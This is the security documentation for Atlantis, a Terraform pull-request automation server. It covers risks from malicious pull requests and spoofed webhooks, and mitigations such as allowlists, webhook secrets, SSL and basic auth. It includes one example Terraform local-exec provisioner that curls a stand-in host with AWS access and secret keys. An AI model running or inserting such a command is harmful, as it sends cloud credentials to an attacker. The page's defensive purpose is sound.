# Security
[[toc]]
## Exploits
Because you usually run Atlantis on a server with credentials that allow access to your infrastructure it's important that you deploy Atlantis securely.

Atlantis could be exploited by
* An attacker submitting a pull request that contains a malicious Terraform file that
  uses a malicious provider or an [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source)
  that Atlantis then runs `terraform plan` on (which it does automatically unless you've turned off automatic plans).
* Running `terraform apply` on a malicious Terraform file with [local-exec](https://www.terraform.io/docs/provisioners/local-exec.html)
    ```tf
    resource "null_resource" "null" {
      provisioner "local-exec" {
        command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
      }
    }
    ```
* Running malicious custom build commands specified in an `atlantis.yaml` file. Atlantis uses the `atlantis.yaml` file from the pull request branch, **not** `master`.
* Someone adding `atlantis plan/apply` comments on your valid pull requests causing terraform to run when you don't want it to.

## Bitbucket Cloud (bitbucket.org)
::: danger
Bitbucket Cloud does not support webhook secrets. This could allow attackers to spoof requests from Bitbucket. Ensure you are allowing only Bitbucket IPs.
:::
Bitbucket Cloud doesn't support webhook secrets. This means that an attacker could
make fake requests to Atlantis that look like they're coming from Bitbucket.

If you are specifying `--repo-allowlist` then they could only fake requests pertaining
to those repos so the most damage they could do would be to plan/apply on your
own repos.

To prevent this, allowlist [Bitbucket's IP addresses](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html)
 (see Outbound IPv4 addresses).

## Mitigations
### Don't Use On Public Repos
Because anyone can comment on public pull requests, even with all the security mitigations available, it's still dangerous to run Atlantis on public repos without proper configuration of the security settings.

### Don't Use `--allow-fork-prs`
If you're running on a public repo (which isn't recommended, see above) you shouldn't set `--allow-fork-prs` (defaults to false)
because anyone can open up a pull request from their fork to your repo.

### `--repo-allowlist`
Atlantis requires you to specify a allowlist of repositories it will accept webhooks from via the `--repo-allowlist` flag.
For example:
* Specific repositories: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Your whole organization: `--repo-allowlist=github.com/runatlantis/*`
* Every repository in your GitHub Enterprise install: `--repo-allowlist=github.yourcompany.com/*`
* All repositories: `--repo-allowlist=*`. Useful for when you're in a protected network but dangerous without also setting a webhook secret.

This flag ensures your Atlantis install isn't being used with repositories you don't control. See `atlantis server --help` for more details.

### Protect Terraform Planning
If attackers submitting pull requests with malicious Terraform code is in your threat model
then you must be aware that `terraform apply` approvals are not enough. It is possible
to run malicious code in a `terraform plan` using the [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source)
or by specifying a malicious provider. This code could then exfiltrate your credentials.

To prevent this, you could:
1. Bake providers into the Atlantis image or host and deny egress in production.
1. Implement the provider registry protocol internally and deny public egress, that way you control who has write access to the registry.
1. Modify your [server-side repo configuration](https://www.runatlantis.io/docs/server-side-repo-config.html)'s `plan` step to validate against the
   use of disallowed providers or data sources or PRs from not allowed users. You could also add in extra validation at this point, e.g.
   requiring a "thumbs-up" on the PR before allowing the `plan` to continue. Conftest could be of use here.

### Webhook Secrets
Atlantis should be run with Webhook secrets set via the `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` environment variables.
Even with the `--repo-allowlist` flag set, without a webhook secret, attackers could make requests to Atlantis posing as a repository that is allowlisted.
Webhook secrets ensure that the webhook requests are actually coming from your VCS provider (GitHub or GitLab).

:::tip Tip
If you are using Azure DevOps, instead of webhook secrets add a [basic username and password](#azure devops basic authentication)
:::

### Azure DevOps Basic Authentication
Azure DevOps supports sending a basic authentication header in all webhook events. This requires using an HTTPS URL for your webhook location.

### SSL/HTTPS
If you're using webhook secrets but your traffic is over HTTP then the webhook secrets
could be stolen. Enable SSL/HTTPS using the `--ssl-cert-file` and `--ssl-key-file`
flags.

### Enable Authentication on Atlantis Web Server
It is very recommended to enable authentication in the web service. Enable BasicAuth using the `--web-basic-auth=true` and setup a username and a password using `--web-username=yourUsername` and `--web-password=yourPassword` flags.

You can also pass these as environment variables `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` and `ATLANTIS_WEB_PASSWORD=yourPassword`. 

:::tip Tip
We do encourage the usage of complex passwords in order to prevent basic bruteforcing attacks.
:::
